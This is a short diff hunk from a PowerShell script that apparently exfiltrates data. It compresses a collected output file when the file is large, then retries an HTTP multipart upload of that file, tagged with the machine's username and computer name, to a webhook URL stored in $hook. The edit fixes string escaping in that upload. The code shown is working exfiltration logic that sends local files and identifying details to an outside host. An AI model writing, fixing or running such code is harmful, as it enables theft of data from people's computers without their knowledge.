@@ -67,7 +67,7 @@ if((Get-Item $out).Length -gt 9MB){Compress-Archive $out "$out.zip" -Force;$out=
 for($i=1;$i -le 3;$i++){
  try{
   $hc=New-Object Net.Http.HttpClient;$mp=New-Object Net.Http.MultipartFormDataContent
-  $mp.Add((New-Object Net.Http.StringContent "``$env:USERNAME` @ ``$env:COMPUTERNAME``"),'content')
+  $mp.Add((New-Object Net.Http.StringContent "$env:USERNAME @ $env:COMPUTERNAME"),'content')
   $fs=[IO.File]::OpenRead($out)
   $mp.Add((New-Object Net.Http.StreamContent $fs),'file',(Split-Path $out -Leaf))
   $hc.PostAsync($hook,$mp).Result.StatusCode|Out-Null
